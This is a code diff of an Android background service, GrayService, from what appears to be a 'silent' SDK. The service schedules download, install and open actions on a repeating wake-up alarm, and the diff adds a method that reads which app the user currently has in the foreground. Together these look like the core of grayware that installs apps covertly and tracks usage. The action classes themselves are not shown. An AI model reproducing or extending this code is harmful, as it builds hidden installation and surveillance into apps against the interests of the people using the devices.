@@ -1,5 +1,6 @@
 package sdk.grayweb.com.slientsdk;
 
+import android.app.ActivityManager;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.app.Service;
@@ -7,28 +8,20 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.os.Binder;
 import android.os.IBinder;
 import android.util.Log;
 
-import com.liulishuo.filedownloader.FileDownloader;
-import com.liulishuo.filedownloader.util.FileDownloadHelper;
-
-import java.net.Proxy;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.List;
 import java.util.Random;
-import java.util.concurrent.TimeUnit;
 
-import okhttp3.OkHttpClient;
 import sdk.grayweb.com.slientsdk.action.DownloadAction;
 import sdk.grayweb.com.slientsdk.action.IAction;
 import sdk.grayweb.com.slientsdk.action.InitAction;
 import sdk.grayweb.com.slientsdk.action.InstallAction;
 import sdk.grayweb.com.slientsdk.action.OpenAction;
-import sdk.grayweb.com.slientsdk.api.InitApi;
-import sdk.grayweb.com.slientsdk.util.DivesUtil;
+import sdk.grayweb.com.slientsdk.util.DownLoadUtil;
 
 /**
  * Created by engine on 16/5/10.
@@ -44,6 +37,7 @@ public class GrayService extends Service {
         actionList.add(new DownloadAction(this));
         actionList.add(new OpenAction(this));
         actionList.add(new InstallAction(this));
+        DownLoadUtil.initDir();
         //初奴化数据
         //初始化闹钟
         new InitAction(this).doAction();
@@ -96,17 +90,19 @@ public class GrayService extends Service {
         AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
 //        am.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), sender);
         am.setRepeating(AlarmManager.RTC_WAKEUP,
-                calendar.getTimeInMillis(), 60 * 1000, sender);
+                calendar.getTimeInMillis(), 3600 * 1000, sender);
     }
-    private IAction preAction(){
-        Calendar calendar = Calendar.getInstance() ;
-        int hour = calendar.get(Calendar.HOUR_OF_DAY) ;
-        return null ;
+
+    public static String getCurrentPk(Context context){
+        // 当前正在运行的应用的包名
+        ActivityManager am = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);
+        String currentrunningpk = am.getRunningTasks(1).get(0).topActivity.getPackageName();
+        return currentrunningpk;
     }
+
     private BroadcastReceiver cupReciver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
-            Log.e("eeee","doAction");
             doAction();
         }
     };
